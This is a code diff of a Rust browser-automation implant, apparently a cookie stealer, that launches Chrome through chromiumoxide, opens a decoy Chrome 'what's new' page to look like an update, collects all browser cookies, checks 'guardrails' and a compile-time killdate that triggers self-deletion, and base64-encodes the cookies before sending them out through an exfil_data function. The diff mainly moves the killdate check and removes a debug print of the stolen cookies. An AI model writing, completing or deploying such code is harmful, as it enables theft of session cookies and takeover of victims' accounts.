@@ -1,3 +1,6 @@
+use futures::StreamExt;
+use tokio::time::{sleep, Duration};
+use base64::{engine::general_purpose::URL_SAFE, Engine};
 use chromiumoxide::{
     browser::{Browser, BrowserConfig},
     cdp::browser_protocol::{
@@ -11,15 +14,6 @@ use std::{
     path::PathBuf,
     collections::HashSet,
 };
-
-use futures::StreamExt;
-use tokio::time::{sleep, Duration};
-
-use crate::exfil::exfil_data;
-
-use serde_json;
-
-use base64::{engine::general_purpose::URL_SAFE, Engine};
 
 pub async fn run_browser(junc_path: &PathBuf) -> Result<bool, Box<dyn std::error::Error>> {
     let (mut browser, mut handler) = Browser::launch(
@@ -35,13 +29,14 @@ pub async fn run_browser(junc_path: &PathBuf) -> Result<bool, Box<dyn std::error
 
     let _ = tokio::spawn(async move { while let Some(_) = handler.next().await {} });
 
+    let page : chromiumoxide::Page;
     #[cfg(feature = "debug")]
     println!("[*] Retrieving cookies...");
     let cookies = browser.get_cookies().await?;
 
     if cookies.is_empty() {
         // Open page for whats new (simulate update)
-        let page = browser.new_page("https://developer.chrome.com/new").await?;
+        page = browser.new_page("https://developer.chrome.com/new").await?;
 
         #[cfg(feature = "debug")]
         println!("[*] Checking guardrails...");
@@ -59,8 +54,16 @@ pub async fn run_browser(junc_path: &PathBuf) -> Result<bool, Box<dyn std::error
         #[cfg(feature = "debug")]
         println!("[+] Guardrails check passed");
     } else {
-        let _ = browser.new_page("chrome://newtab").await?;
+        page = browser.new_page("chrome://newtab").await?;
     }
+
+    #[cfg(feature = "debug")]
+    println!("[*] Checking killdate...");
+    let current_timestamp = page.evaluate("Math.floor(Date.now() / 1000)").await?.into_value::<u64>()?;
+    let killdate_timestamp: u64 = env!("KILLDATE_TIMESTAMP").parse()?;
+
+    // Compare the timestamps
+    let delete_self: bool = current_timestamp > killdate_timestamp;
 
     // Lookup table to keep track of pages already injected.
     let mut injected_pages: HashSet<TargetId> = HashSet::new();
@@ -112,15 +115,6 @@ pub async fn run_browser(junc_path: &PathBuf) -> Result<bool, Box<dyn std::error
         sleep(Duration::from_secs(1)).await;
     }
 
-    #[cfg(feature = "debug")]
-    println!("[*] Checking killdate...");
-    let page = browser.new_page("about:blank").await?;
-    let current_timestamp = page.evaluate("Math.floor(Date.now() / 1000)").await?.into_value::<u64>()?;
-    let killdate_timestamp: u64 = env!("KILLDATE_TIMESTAMP").parse()?;
-
-    // Compare the timestamps
-    let delete_self: bool = current_timestamp > killdate_timestamp;
-
     if delete_self {
         #[cfg(feature = "debug")]
         println!("[-] Current date is past killdate.");
@@ -134,11 +128,9 @@ pub async fn run_browser(junc_path: &PathBuf) -> Result<bool, Box<dyn std::error
         let cookies_json = serde_json::to_string(&cookies)?;
         let encoded_cookies = URL_SAFE.encode(cookies_json.as_bytes());
 
-        println!("Base64 Encoded String (Full): {}", encoded_cookies);
-
         #[cfg(feature = "debug")]
         println!("[*] Sending cookies...");
-        if let Err(_e) = exfil_data(&encoded_cookies).await {
+        if let Err(_e) = crate::exfil::exfil_data(&encoded_cookies).await {
             #[cfg(feature = "debug")]
             eprintln!("[!] Error: {}", _e);
         }
